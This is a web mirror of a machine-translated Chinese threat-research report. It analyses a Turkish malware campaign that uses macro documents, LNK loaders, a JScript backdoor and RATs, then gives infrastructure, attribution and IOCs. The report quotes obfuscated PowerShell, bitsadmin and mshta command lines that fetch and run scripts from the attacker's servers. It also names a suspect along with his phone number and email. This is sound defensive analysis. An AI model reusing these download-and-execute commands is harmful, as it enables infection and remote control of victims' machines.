<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤸🏼 🍱 👨🏼‍🌾 蠕虫，老鼠和自由职业者的土耳其技巧 🍵 🛅 🧜🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="积极技术安全中心（PT专家安全中心）威胁研究小组的专家发现了一个恶意活动，该活动至少自2018年1月中以来一直活跃。 该操作针对巴西，英国，匈牙利，德国，拉脱维亚，美国，土耳其和菲律宾的用户。 多种工具和技术可用于感染和控制受害者的PC。 该报告详细介绍了感染的阶段，使用的实用程序，组织网络基础结构...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>蠕虫，老鼠和自由职业者的土耳其技巧</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/479998/">  <a href="https://www.ptsecurity.com/ru-ru/research/pt-esc-threat-intelligence/">积极技术安全中心（PT专家安全中心）</a>威胁研究小组的<a href="https://www.ptsecurity.com/ru-ru/research/pt-esc-threat-intelligence/">专家</a>发现了一个恶意活动，该活动至少自2018年1月中以来一直活跃。 该操作针对巴西，英国，匈牙利，德国，拉脱维亚，美国，土耳其和菲律宾的用户。 多种工具和技术可用于感染和控制受害者的PC。 该报告详细介绍了感染的阶段，使用的实用程序，组织网络基础结构的功能以及导致我们成为黑客候选人的数字踪迹。 <br><br><h2> 总结 </h2><br><ul><li> 攻击者在十年前利用现代技术对蠕虫进行了处理 </li><li> 与广泛的网络基础架构结合使用的工具动物园 </li><li> 主要嫌疑人是土耳其自由职业者 </li></ul><a name="habracut"></a><br><h2> 有效负载交付 </h2><br><h3> 办公文件 </h3><br>  2019年4月5日，作为跟踪新威胁的一部分，PT专家安全中心专家发现了可疑的办公室文档。 扩展名为.docm的文件（具有宏支持的新示例的MS Word文档）： <br><br><ul><li> 在发现前几天（2019-03-31）创建， </li><li> 包含用于说服用户启用宏的图像， </li><li> 是在使用土耳其语的系统上创建的（元数据字段的值证明了这一点：“ KonuBaşlığı”-“主题标题”，“ Konu Ba l，1”-“主题标题，1”； Google翻译翻译）。 </li></ul><br><img src="https://habrastorage.org/webt/vu/vp/fj/vuvpfjfs9iissnmjcse2lyndlmk.png"><br><br>  <i>图</i>  <i>1.典型的宏通知陷阱</i> <br><br> 宏代码有点混乱，但是太简单了：使用PowerShell的背景智能传输管理（BITS）cmdlet，可以从攻击者的服务器下载并运行JScr​​ipt中的脚本： <br><br><pre><code class="javascript hljs">Shell (<span class="hljs-string"><span class="hljs-string">"pow"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ershe"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ll -comm"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"and "</span></span><span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb1.js;');Start-Process -WindowStyle hidden -FilePath 'cmd.exe' -ArgumentList '/c %systemroot%\system32\wscript %temp%\bb1.js'"</span></span><span class="hljs-string"><span class="hljs-string">""</span></span>)</code> </pre> <br> 使用PowerShell和非典型模块从Web服务器下载文件的原因是试图规避对不受信任程序的启动和执行的限制。 <br><br> 有几个类似的文件。 例如，其中一个是.doc文件（旧式MS Word文档），带有土耳其语字符的代码页。 宏的工作也非常相似： <br><br><pre> <code class="javascript hljs">Shell <span class="hljs-string"><span class="hljs-string">"cmd.exe /c bitsadmin /transfer myjob /download /priority FOREGROUND https://definebilimi.com/up3e.js %temp%\o2.js &amp; wscript.exe %temp%\o2.js"</span></span>, vbHide</code> </pre> <br> 在这种情况下，作者使用相同的BITS技术，但要使用合法的系统实用程序bitsadmin。 有趣的是，文档的创建日期和在公共资源中发现文档的时间都会在2018年7月中旬之前寄给我们。 因此，攻击至少持续一年左右。 另外，使用相同的攻击者服务器来下载有效负载。 在JScript中命名可加载脚本的方法与此类似。 <br><br> 另一个文档具有扩展名.rtf（富文本格式）。 它包含多个具有相同内容的.xls文档（旧式MS Excel文档）。 宏代码与从原始文档中提取的宏代码完全相同，并且代码页值和HeadingPairs XML字段的重合导致相同的作者身份。 <br><br><h3>  LNK快捷方式 </h3><br> 值得注意的是，在这场运动中，不仅办公室文件被用作感染的初始阶段。 我们遇到了几个恶意的.lnk文件（Windows Shell链接），它们在启动时运行了以下命令： <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /c powershell -command <span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb.js;')"</span></span> &amp; %systemroot%\system32\wscript %temp%\bb.js</code> </pre> <br> 标签于2019年3月中旬至4月下旬分发。 <br><br> 快捷方式元数据包含用户名win7-bilgisayar（来自土耳其语“ win7-computer”）-创建它们的系统的用户。 <br><br> 我们可以安全地假设网络钓鱼电子邮件是在感染的第一阶段传递恶意文件的最可能方案。 <br><br><h2> 胡迪尼变身 </h2><br> 感染第一阶段的所有检查对象都下载并在JScript中运行相同的脚本（不考虑微小差异）。 文件不会被混淆和打包，唯一使分析复杂化的是随机变量名。 它是WSH平台上的后门。 在他作品的特征中，可以区分以下几点： <br><br><ul><li> 管理服务器的主机地址和端口受脚本保护 </li><li> 与C＆C的交互是通过HTTP协议的POST请求进行的。 </li><li> 在工作开始时，将字符串“ is-bekle”插入URI字段，从土耳其语翻译为“ is-ready”。 </li><li>  User-Agent字段包含有关具有指定定界符（在本例中为“ &lt;|&gt;”）的系统的简要信息： <br><ul><li> 硬盘序列号 </li><li> 用户名 </li><li> 系统版本 </li><li> 脚本名称 </li><li> 防病毒名称 </li><li> 环境变量％ProgramData％的值， </li><li> 系统中存在.Net FrameWork 4.5.2， </li><li> 请求之间的超时， </li><li> 系统中的Java。 </li></ul><br></li><li> 通过给定的硬盘驱动器序列号<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Kotler-The-Adventures-Of-Av-And-The-Leaky-Sandbox-wp.pdf">检查</a>卡巴斯基实验室沙箱主题<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Kotler-The-Adventures-Of-Av-And-The-Leaky-Sandbox-wp.pdf">的</a>环境。 万一碰巧，它将停止工作。 </li><li> 它从服务器接收并执行给定的命令； 以下是其中一些： <br><ul><li> 从服务器下载文件， </li><li> 将文件上传到服务器 </li><li> 收集剪贴板内容， </li><li> 收集目录内容， </li><li> 收集过程信息， </li><li> 在cmd.exe解释器中运行命令， </li><li> 拍摄并发送屏幕截图， </li><li> 检索并提交带有密码的Chrome和Opera数据库。 </li></ul><br></li></ul><br><img src="https://habrastorage.org/webt/ky/xj/ur/kyxjurbcxvvpazharap_hq6fh68.png"><br>  <i>图</i>  <i>2.从攻击者服务器在JScript中加载的脚本的开头</i> <br><br> 由于存在注释，代码的结构，使用的命令名称以及用于收集有关系统的信息的格式，因此可以与著名的VBS蠕虫Houdini相似。  2013年，我们来自FireEye的同事对该木马<a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">的</a>功能，命令的处理以及以类似方式发生的信息进行了详细<a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">分析</a> 。 在我们的案例中，攻击者似乎以著名蠕虫的模型为基础，不是重写了VBScript中的功能，而是重写了JScript中的功能，并用土耳其语替换了一些英语行。 <br><br><img src="https://habrastorage.org/webt/z4/52/2t/z4522tdmc-74q3wrlsz_op7tqki.png"><br><br>  <i>图</i>  <i>3.处理JScript后门命令</i> <br><br> 值得注意的是，使用包含子字符串“ Bcorp”的字符串作为命令执行结果的标记。 它也以管理服务器ip1 [。] Bcorp.fun的名称出现。 <br><br><h3> 在攻击者服务器上 </h3><br> 根据Shodan的说法，截至2019年4月30日，攻击者托管了一个基于<a href="https://www.appserv.org/en/">AppServ</a>的Web服务器。 似乎服务器没有经过仔细配置：例如，phpinfo页面可用，其中显示了有趣的配置信息。 在分析从中下载了恶意软件的Web链接时，事实证明服务器具有一个打开目录（./a目录），其中列出了其他攻击者的工具。 <br><br><img src="https://habrastorage.org/webt/ti/rg/ms/tirgmslrqtgw3epiumyzv0yrag0.png"><br><br>  <i>图</i>  <i>4.攻击者服务器的主页</i> <br><br><img src="https://habrastorage.org/webt/cq/-d/g1/cq-dg1v3yxrbqgprtstzphvyogm.png"><br><br>  <i>图</i>  <i>5.攻击者服务器上的phpinfo页面</i> <br><br><img src="https://habrastorage.org/webt/xc/cy/hj/xccyhjiblf6w1xkmzj51prgol-0.png"><br><br>  <i>图</i>  <i>6.攻击者服务器的开放目录在2019年4月结束时的清单</i> <br><br><img src="https://habrastorage.org/webt/ji/zs/r0/jizsr0d3hrbqout2mrth5hfq794.png"><br><br>  <i>图</i>  <i>7.到2019年5月底，攻击者服务器的打开目录列表</i> <br><br> 以下是检测到的文件的说明。 <br><br><h3> 胡迪尼脚本 </h3><br> 首先，我们收到了上面讨论的经过修饰的Houdini蠕虫的许多变体。 从一个版本到另一个版本，脚本进行了较小的更改：主机名（husan2.ddns.net，ip1.bcorp.fun，ip1.qqww.eu），端口（86、87），变量名，单个命令出现或消失。 一个版本甚至在JScript中被构造为scriptlet。 <br><br><img src="https://habrastorage.org/webt/vp/7v/se/vp7vsedyr71hixfb31ffenjzdg4.png"><br><br>  <i>图</i>  <i>8. Houdini JScript作为scriptlet</i> <br><br><h3>  Bcorp罐 </h3><br> 自制的轻量级Java后门。 它通过端口22122上的TCP与C＆C交互。它可以： <br><br><ul><li> 在cmd.exe解释器中执行命令， </li><li> 确定系统版本 </li><li> 列出目录 </li><li> 上传文件 </li><li> 在启动目录和注册表启动分支中注册。 </li></ul><br> 看来这就是为什么经过修改的蠕虫会在系统中检查Java。 同时，不清楚为什么要使用附加的后门，因为原始后门具有足够的功能。 <br><br><h3> 获取chromecred </h3><br>  <a href="https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/DumpCreds/PS">PowerShell包装器，</a>用于从Chrome浏览<a href="https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/DumpCreds/PS">器</a>中提取历史记录，登录名，密码，Cookie。 某些版本包含用于base86编码形式的x86和x64系统的辅助库System.Data.SQLite.dll，而其他版本则假定它存在于％APPDATA％目录中。 该组件作为主JScript后门的辅助插件提供。 <br><br><h3> 启动键记录器 </h3><br> 简单的键盘记录程序的<a href="">PowerShell实现</a> 。 该组件作为主JScript后门的辅助插件提供。 <br><br><img src="https://habrastorage.org/webt/lv/z9/hu/lvz9huoub4btquoi2gbiwd8ipsg.png"><br><br>  <i>图</i>  <i>9. PowerShell键盘记录器代码段</i> <br><br><h3>  WebBrowserPassView </h3><br>  Nirsoft <a href="https://www.nirsoft.net/utils/web_browser_password.html">的实用程序</a> ，用于从流行的浏览器获取登录名和密码。 攻击者使用的是作者的版本，之前已将其与ASPack打包在一起，从而使分析复杂化或通过指标跳过检测。 <br><br><h3>  NetWire RAT </h3><br> 公开的，可用于远程PC控制的商业<a href="https://ultrahacks.org/shop/product/netwire-rat/">工具</a> 。 被各种网络犯罪团体使用。 恶意软件开发人员通过将RAT打包到.NET平台上的PE中并使用DeepSea 4.1代码混淆器，使分析和发现变得复杂。 <br><br><h3>  TCP监听 </h3><br>  AllScoop提供的一个简单的<a href="https://www.allscoop.com/tcp-listen.php">GUI实用程序</a> ，用于测试路由器或防火墙的参数。 每个侦听端口均以给定的字符串作为响应，从而终止连接。 <br><br><img src="https://habrastorage.org/webt/ud/cr/k-/udcrk-bohjearwqg5thpcia9-ym.png"><br><br>  <i>图</i>  <i>10. TCP监听实用程序的GUI</i> <br><br><h3>  LNK装载机 </h3><br> 快捷方式加载器，类似于之前已经考虑的。 在启动时，运行以下命令： <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /v /c <span class="hljs-string"><span class="hljs-string">"set i=h&amp;&amp;ms!i!ta http://ip1.qqww.eu/1/f.htm"</span></span></code> </pre> <br> 这次，快捷方式是在另一个用户（desktop-amkd3n3）下创建的。 <br><br><h3> 脚本加载器 </h3><br> 在这个小组中，我们结合了上述RAT的各种引导程序。 它们都很小（最大1 KB），具有各种格式（.htm，.xsl，.hta等），代码以多种脚本语言（JScript，PowerShell）执行，并即时进行C＃编译。 以下是一些示例的代码段： <br><br><img src="https://habrastorage.org/webt/ga/dk/mj/gadkmjw2x2s7i9br6wvigjbduho.png"><br><br>  <i>图</i>  <i>11. .htm加载程序的片段</i> <br><br><img src="https://habrastorage.org/webt/ta/du/fk/tadufk1tskw_mu33lyhp9o2uieg.png"><br><br>  <i>图</i>  <i>12. .xsl引导程序的片段</i> <br><br><img src="https://habrastorage.org/webt/5o/qi/nn/5oqinngzwzjeqgcg_pvv1c7vsgo.png"><br><br>  <i>图</i>  <i>13. .ps1引导程序的片段</i> <br><br><h3> 小型pe装载机 </h3><br> 除了脚本加载器，还发现了.NET平台上的PE文件。 它们也很小（最大10 KB），具有类似的功能： <br><br><img src="https://habrastorage.org/webt/gi/vo/lc/givolcsz3joqwnt0zqtq8ftqzui.png"><br><br>  <i>图</i>  <i>14.一个PE加载程序的反编译代码示例</i> <br><br><h3>  xRAT </h3><br> 一个公开可用，免费分发的<a href="https://github.com/c4bbage/xRAT">项目，</a>用于远程PC管理。 各种版本和修改是广泛的。 用C＃编写，部分混淆。 <br><br><h3>  Bcorp面板与 建造者 </h3><br>  JScript后门的控制服务器部分。 同时，它是客户端部分的设计师。 代表.NET平台上的PE。 不混淆，不包装。 该接口类似于为已提到的VBS蠕虫Houdini重新设计的服务器部分。 除了发送命令之外，它还加载了前面描述的其他组件和插件：Java环境，Nirsoft的PowerShell脚本和实用程序，用于从浏览器收集信息，PowerShell脚本用于拦截击键等。令人奇怪的是，该项目称为BcorpRat ，可以在下图的窗口标题中看到。 在源代码名称空间的名称中是“ Btech”行，我们将在稍后返回。 <br><br><img src="https://habrastorage.org/webt/m3/ix/63/m3ix63sjf1-fe3rawasy_jmhldk.png"><br><br>  <i>图</i>  <i>15. JScript后门控制面板，主窗口</i> <br><br><img src="https://habrastorage.org/webt/ob/qq/8g/obqq8gb4arhzlfjowoxato5v3yu.png"><br><br>  <i>图</i>  <i>16.控制面板JScript后门，客户端部分的设计器窗口</i> <br><br><h2> 网络基础设施 </h2><br> 接下来，我们将对攻击者的这些或其他恶意程序与之交互的地址进行更详细的分析。 让我们从definebilimi.com域开始，该域可以通过Office文档和快捷方式加载程序进行访问。 <br><br><h3>  definebilimi.com </h3><br> 在2018年1月16日，此域具有新所有者。 顺便说一句，“ define bilimi”在土耳其语中的字面翻译是“科学宝藏”。 以下是当时WHOIS记录历史中最有趣的数据。 <br> 表1.有关definebilimi.com域的注册人（所有者）的信息 <br><br><div class="scrollable-table"><table><tbody><tr><th> 记录名称 </th><th> 记录值 </th></tr><tr><td> 注册人姓名 </td><td> 科雷·雅曼（Koray Yaman） </td></tr><tr><td> 登记人街 </td><td>  123456 </td></tr><tr><td> 注册城市 </td><td> 伊斯坦堡 </td></tr><tr><td> 注册国 </td><td>  TR </td></tr><tr><td> 注册人电话 </td><td>  +90.5350167352 </td></tr><tr><td> 注册人电子邮件 </td><td>  btech@hotmail.com.tr </td></tr></tbody></table></div><br> 声称数据是真实的会很鲁re。 代码中指明的国家/地区和土耳其语出现痕迹的频率使我们能够假定这些巧合不是偶然的。 电子邮件地址包含子字符串“ btech”，我们已经对其进行了注意。 <br><br> 提供有关已注册域信息的NS服务器的更改历史看起来很有趣： <br><br><div class="scrollable-table"><table><tbody><tr><th> 日期 </th><th> 动作片 </th><th> 伺服器 </th></tr><tr><td>  2018/03/17 </td><td> 新条目 </td><td>  buhar.biz </td></tr><tr><td>  2019/01/15 </td><td> 记录变更 </td><td>  definebilimi.com </td></tr><tr><td>  2019/06/04 </td><td> 记录变更 </td><td>  qqww.eu </td></tr></tbody></table></div><br>  <i>表2. definebilimi.com域的NS服务器的历史记录</i> <br><br>  buhar.biz和qqww.eu主机已经在较早的恶意软件中遇到过。 <br><br><h3> 布哈尔 </h3><br> 该域名的新历史（来自土耳其语的“ buhar”-“ couples”）与definebilimi.com的历史同一天-2018年1月16日开始。 <br><br><div class="scrollable-table"><table><tbody><tr><th> 记录名称 </th><th> 记录值 </th></tr><tr><td> 注册人姓名 </td><td> 巴尔塔扎尔 </td></tr><tr><td> 注册组织 </td><td> 布哈鲁斯 </td></tr><tr><td> 登记人街 </td><td> 吉兹利 </td></tr><tr><td> 注册城市 </td><td> 吉兹利 </td></tr><tr><td> 注册国 </td><td>  TR </td></tr><tr><td> 注册人电话 </td><td>  +1.123456789 </td></tr><tr><td> 注册人电子邮件 </td><td>  buharcin@yandex.com </td></tr></tbody></table></div><br>  <i>表3.有关域buhar.us的注册人（所有者）的信息</i> <br><br> 情况类似：同样，除了邮政地址（土耳其语中的“ buharcin”-“机车”）以外，某些数据看起来是伪造的。 <br><br><h3>  bcorp.fun </h3><br> 该域已于2019年3月23日注册。 除了土耳其再次被注册为国家以外，Bcorp还被列为客户组织。 实际上，我们在域名本身中看到了相同的东西，如前面几段所述。 <br><br><h3>  husan2.ddns.net </h3><br> 奇怪的是，攻击者不仅以经典方式获取主机。 自2019年3月中旬以来，已记录了所谓动态DNS服务器的使用。 该技术使攻击者可以有效地隐藏其IP地址，并确保其控制中心的生命力。 值得注意的是在名称选择方面的可预测性：例如，几个月后，发现使用了husan3.ddns.net域，但是husan.ddns.net域的活动可以追溯到2017年4月。 <br><br><h3>  bkorp.xyz </h3><br> 自4月初以来，黑客继续沿匿名化道路前进，并使用位于巴拿马的WhoisGuard，Inc.服务注册了域名；  bkorp.xyz，prntsrcn.com和i37-imgur.com只是几个示例。 使用的NS服务器仍将它们链接到其他恶意域。 <br><br><h3>  qqww.eu </h3><br> 除了该域（如域bcorp.fun）具有子域ip1的事实外，还有另一个重要的细节。 注册者上的信息表明组织Osbil Technology Ltd.，据称位于柏林。 实际上，同名的组织位于法马古斯塔市的塞浦路斯海岸，该城市位于已得到部分承认的北塞浦路斯土耳其共和国的领土内。 公司的官方<a href="https://www.yoncu.com/">网站</a>位于域上，该域是2019年3月至2019年5月域bcorp.fun的NS服务器。 我们没有发现名称服务器受到损害的迹象，并且NS提供程序的基础结构功能（在注册人列中用提供程序数据替换客户机）使得可以从公共访问中隐藏客户机信息。 <br><br><img src="https://habrastorage.org/webt/7s/zz/q2/7szzq2mjgkuppmdvnpd_xdrk41c.png"><br><br>  <i>图</i>  <i>17.有关qqww.eu域的注册人（所有者）的信息</i> <br><br><h3>  IP地址 </h3><br> 为了完整起见，以下是IP地址-某些域在不同的时间间隔对应于它们： <br><ul><li>  5.255.63.12 <br><ul><li>  bcorp.fun </li><li>  husan.ddns.net </li><li>  husan2.ddns.net </li><li>  husan3.ddns.net </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.137 <br><ul><li>  bcorp.fun </li><li>  bkorp.xyz </li><li>  definebilimi.com </li><li>  i36-imgur.com </li><li>  i37-imgur.com </li><li>  i38-imgur.com </li><li>  i39-imgur.com </li><li>  prntsrcn.com </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.140 <br><ul><li>  bkorp.xyz </li><li> 布哈尔 </li></ul><br><h2> 在黑客之后 </h2><br> 在恶意和辅助工具中，攻击者的服务器上发现一个奇怪的图像： <br><br><img src="https://habrastorage.org/webt/c9/pi/gf/c9pigfzw8s36wno_idj18gwv57u.png"><br><br>  <i>图</i>  <i>18.攻击者所在目录中的映像</i> <br><br> 我们没有降低图片的分辨率，而是以它在主机上的形式将其放在此处。 <br><br> 尽管图像质量很差，我们仍可以确定这是资源blockr.io上有关加密货币已完成交易的页面的屏幕截图。 这无法正常工作，因此我们尝试查找与名称IMG_JPEG-0371e4dce3c8804f1543c3f0f309cc11.jpg相关的所有内容，黑客使用该名称存储了该图像。 这些痕迹导致在线分析仪上<a href="https://www.hybrid-analysis.com/sample/9f1f04db605ba35a97c1a0554c1932f5848c9bb7a4cb915cde670b0bb26dc7b6%3FenvironmentId%3D100">处理</a>了一些文件，其名称与我们的图片名称重合。 处理的对象是Windows快捷方式，类似于我们之前已经检查过的快捷方式。 附有一张土耳其公民身份证的照片，他的姓氏与注册域名Yaman时显示的姓氏重合。 <br><br><img src="https://habrastorage.org/webt/pr/b7/ca/prb7cacgvurge0qqdt3tqnbthxe.png"><br><br>  <i>图</i>  <i>19.带引导程序的身份证</i> <br><br> 用户下载文件并没有导致对在线沙箱中快捷方式的处理，而是通过传输需要下载和处理对象的URL： <br><br> <code>hxxps://github.com/btechim/prntsrcn/blob/nm46ny/IMG-0371e4dce3c8804f1543c3f0f309cc11.jpg.lnk?raw=true</code> <br> <br> 用户的github帐户已被阻止，但是，使用链接我们可以设置用户昵称（btechim）和项目名称（prntsrcn）。 项目名称与在广告系列（prntsrcn.com）中找到的域之一的名称一致，并且用户的昵称包含子字符串btech，该子字符串出现在上述管理面板的程序代码中。 <br><br> 搜索用户的昵称使我们找到了自由职业者资源，来自土耳其的用户<a href="https://www.freelancer.com/u/btechim">页面</a>位于该资源上-具有相同的昵称，已确认的电话号码，邮寄地址和Facebook个人资料-在网络安全领域提供其开发软件的服务。 <br><br><img src="https://habrastorage.org/webt/cf/f2/y0/cff2y0moihsk3fy6abo_wu2489c.png"><br><br>  <i>图</i>  <i>20.自由职业者资源上的所谓攻击者页面</i> <br><br><h2> 结论 </h2><br> 几个月来，Positive Technologies的专家一直在监视源自土耳其的恶意活动的发展，并将累积的数据转移到CERT Turkey。 在一系列攻击中，将十年前的现代技术和可循环使用的工具结合起来使用的情况很少见。 攻击者使用了各种工具（按目的，按平台，按难度级别）来完全控制目标PC。 值得注意的是，在准备隐藏网络身份的网络基础结构中，方法的多样性。 但是，罪犯再次没有考虑到所有情况，傲慢自大，遗漏了几处。 该研究被转交给土耳其信息安全事件响应中心。 <br><br><div class="spoiler">  <b class="spoiler_title">国际奥委会</b> <div class="spoiler_text"> 办公室装载机： <br>  3305720da73efbcb7d25edbb7eff5a1a <br>  5b6d77f3e48e7723498ede5d5ba54f26 <br>  621a0133e28edec77a2d3e75115b8655 <br>  712e7ec49ad3b8c91b326b6d5ee8dcd8 <br>  731a3d72e3d36c2270c1d0711c73c301 <br>  929374b35a73c59fe97b336d0c414389 <br><br>  LNK装载机： <br>  3bc5d95e2bd2d52a300da9f3036f5b3b <br>  527069e966b4a854df35aef63f45986a <br>  a4667e0b3bfaca0cda5c344f1475b8e0 <br><br>  Houdini JScript： <br>  04c2ad67de2cea3f247cf50c5e12e969 <br>  5ab9176b9ed9f7a776ec82c412a89eab <br>  84f0d098880747f417703f251a2e0d1c <br>  94c6ba0d812b4daf214263fffc951a20 <br>  a52509a38846b55a524019f2f1a06ade <br>  bf2fb6cdbc9fde99e186f01ad26f959f <br>  c871091ce44594adbd6cf4388381e410 <br>  daf6a9eb55813d1a151695d33506179d <br>  f010af1b330d00abb51​​49e9defdae6ee <br>  ff924faeb9dfd7384c05abe855566fc9 <br><br>  Bcorp罐 <br>  59978b5a9e4ab36da0f31a8f616cc9d3 <br>  a7219da3b0c0730c476fe340dbf7e4e5 <br>  ddac55213089da9ef407bce05ebe653e <br><br> 获取chromecred <br>  11769e9f49123a2af00bd74453221c07 <br>  1a81c9119d7761535c198ddb761979b8 <br>  42a85849a591e65b0254d9bcbdf59f82 <br>  8e49263f33c53ee5bc91bebbf9617352 <br>  c9ab090ad2badb9862fd5b6058428096 <br><br> 启动键记录器 <br>  55daa84475a11ea656183e0ad5ccc608 <br>  aa82fbb6a341d71d2431b6d2ebca027c <br><br>  WebBrowserPassView <br>  7722e086cf7ed59955a1d6ec26f49cf3 <br><br>  NetWire RAT <br>  1470a08bd427bb8738a254ba4f130ff5 <br>  5f8495016773c7834b1c588f0997a6c4 <br><br>  TCP监听 <br>  913567da98185cad9f91a570dc298de1 <br><br> 脚本加载器 <br>  02946d10c6a34fe74826f3c0b0a6a3e0 <br>  1ad644bdba488a6e42ad76aea2c0ee54 <br>  3a2dcf36b9206a135daa73c645a3f56f <br>  4dddd87d3cb80145c9859fd76dfef794 <br>  74c5e5be9f79bd9e7ee84fd046c14e68 <br>  78f4d5fa6c68dae4b03860b54ec6cc67 <br><br> 小型pe装载机 <br>  0f3c56018a7051aebe060454fc981f5b <br>  1b9cefc229daddc4557cea0e3bdf4656 <br>  29e6679107bd9c72aa061371082206bb <br>  b66b7395825b9ed656b768d4e7fe1de7 <br>  fbc606b8b04e51ddb342e29b84ac1edb <br><br>  xRAT <br>  2e9a0637478938cc3e4519aa7b4219cc <br>  7c67c93ba243be32e5fd6a6921ceded3 <br><br>  Bcorp面板与 建造者 <br>  405c987ba1a8568e2808da2b06bc9047 <br>  c3ac8b7a7c8c0d100e3c2af8ccd11441 <br><br>  Bcorp C＆C <br>  bcorp.fun <br>  bkorp.xyz <br> 布哈尔 <br>  definebilimi.com <br>  husan.ddns.net <br>  husan2.ddns.net <br>  husan3.ddns.net <br>  i36-imgur.com <br>  i37-imgur.com <br>  i38-imgur.com <br>  i39-imgur.com <br>  prntsrcn.com <br>  qqww.eu <br>  5.255.63.12 <br>  192.95.3.137 <br>  192.95.3.14 </div></div><br><br>  <b>由</b>正向技术公司的Alexey Vishnyakov <b>发表</b> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN479998/">https://habr.com/ru/post/zh-CN479998/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN479978/index.html">就像没有痛苦一样，没有验证码，并且免费将统一国家人权登记簿的联邦国家财产基金的摘录转换为易于理解的形式（*）</a></li>
<li><a href="../zh-CN479982/index.html">葡萄和昆虫</a></li>
<li><a href="../zh-CN479988/index.html">技术竞赛Radiofest-2019。 总结</a></li>
<li><a href="../zh-CN479992/index.html">如何教UITextView精美脱颖而出</a></li>
<li><a href="../zh-CN479996/index.html">2 nm晶体管：您会斩波还是斩波？</a></li>
<li><a href="../zh-CN480000/index.html">TCP上的服务器WebRTC通道质量指标</a></li>
<li><a href="../zh-CN480002/index.html">回顾DevOpsDays Moscow：来自6份报告的见解</a></li>
<li><a href="../zh-CN480006/index.html">服务器WebRTC over TCP的通道质量指标</a></li>
<li><a href="../zh-CN480008/index.html">尤里·罗加切夫（Yuri Rogachev）：“我来做M-1，却不了解计算机技术”</a></li>
<li><a href="../zh-CN480010/index.html">我们忘记的前3个HTML元素</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
